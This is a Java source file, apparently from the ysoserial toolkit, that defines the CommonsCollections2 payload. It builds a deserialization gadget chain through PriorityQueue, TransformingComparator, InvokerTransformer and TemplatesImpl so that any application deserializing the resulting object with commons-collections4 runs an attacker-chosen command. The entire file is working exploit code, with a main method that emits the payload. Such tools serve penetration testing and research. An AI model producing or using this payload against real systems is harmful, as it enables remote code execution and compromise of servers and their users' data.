package ysoserial.payloads;

import java.util.PriorityQueue;
import java.util.Queue;

import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import ysoserial.payloads.util.ClassFiles;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

/*
	Gadget chain:	
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()
	
	Requires:
		commons-collections4
 */

@SuppressWarnings({ "rawtypes", "unchecked", "restriction" })
public class CommonsCollections2 implements ObjectPayload<Queue<Object>> { 

	public Queue<Object> getObject(final String command) throws Exception {		
		final TemplatesImpl templates = new TemplatesImpl();
		
		Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
			ClassFiles.classAsBytes(Gadgets.TransletPayload.class), 
			ClassFiles.classAsBytes(Gadgets.Foo.class)}); // required to make TemplatesImpl happy
		
		Reflections.setFieldValue(templates, "_name", "Pwnr"); // required to make TemplatesImpl happy
		
		// mock method name until armed
		final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
		
		// create queue with numbers and basic comparator
		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer)); 
		// stub data for replacement later
		queue.add(1); 
		queue.add(1); 
		
		// switch method called by comparator
		Reflections.setFieldValue(transformer, "iMethodName", "newTransformer"); 
		
		// switch contents of queue
		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = templates;
		queueArray[1] = new Gadgets.TransletPayload().withCommand(command);
		
		return queue;
	}
	
	public static void main(final String[] args) {
		PayloadRunner.run(CommonsCollections2.class, args);
	}

}
